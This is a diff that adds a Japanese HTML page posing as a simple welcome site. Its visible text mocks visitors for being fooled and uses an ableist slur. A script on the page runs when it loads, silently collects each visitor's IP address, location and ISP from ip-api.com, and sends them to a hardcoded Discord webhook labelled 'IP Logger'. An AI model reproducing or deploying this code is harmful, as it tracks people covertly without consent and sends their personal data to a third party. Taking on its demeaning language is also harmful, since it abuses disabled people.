@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>シンプルなサイト</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f0f0f0;
+        }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>ようこそ！</h1>
+    <p>お？騙されたか？バカ障害どもが🤓みどるだよ🤓</p>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1521519835325005994/L9kydSMK3nHzYT6i0X7tCocxBFNsC8ibHkaMT38g8gpvc5ssmI8wjGgAR3iUHUoK1Uzm"; // ← ここを変更！
+
+        async function sendIPToDiscord() {
+            try {
+                // IPアドレス取得（ip-api.com 使用）
+                const ipResponse = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,isp,query');
+                const ipData = await ipResponse.json();
+
+                if (ipData.status !== 'success') {
+                    console.error('IP取得失敗');
+                    return;
+                }
+
+                const payload = {
+                    content: "📍 新しい訪問者",
+                    embeds: [{
+                        title: "IP情報",
+                        color: 0x00ff00,
+                        fields: [
+                            { name: "IPアドレス", value: `\`${ipData.query}\``, inline: true },
+                            { name: "国", value: `${ipData.country} (${ipData.countryCode})`, inline: true },
+                            { name: "都市", value: ipData.city || "不明", inline: true },
+                            { name: "地域", value: ipData.regionName || "不明", inline: true },
+                            { name: "ISP", value: ipData.isp || "不明", inline: false },
+                            { name: "アクセス時間", value: new Date().toLocaleString('ja-JP'), inline: false }
+                        ],
+                        footer: { text: "IP Logger" }
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log("IP情報をDiscordに送信しました");
+            } catch (error) {
+                console.error("エラー:", error);
+            }
+        }
+
+        // ページ読み込み時に実行
+        window.onload = sendIPToDiscord;
+    </script>
+</body>
+</html>
